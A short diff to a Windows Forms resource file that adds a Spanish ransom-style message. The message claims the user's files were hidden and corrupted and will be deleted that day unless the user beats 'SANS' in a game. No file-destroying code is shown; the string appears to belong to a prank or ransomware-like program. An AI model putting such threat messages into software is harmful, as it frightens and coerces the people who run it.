@@ -117,4 +117,7 @@
   <resheader name="writer">
     <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
   </resheader>
+  <data name="textBoxMessage.Text" xml:space="preserve">
+    <value>Tus archivos han sido ocultados y corrompidos por mi. Si quieres vover a verlos tendras que vencer a SANS. Toca en "Play" para jugar. Si no lo logras vencer en el dia de hoy, todos tus archivos seran eliminados para siempre. Suerte</value>
+  </data>
 </root>
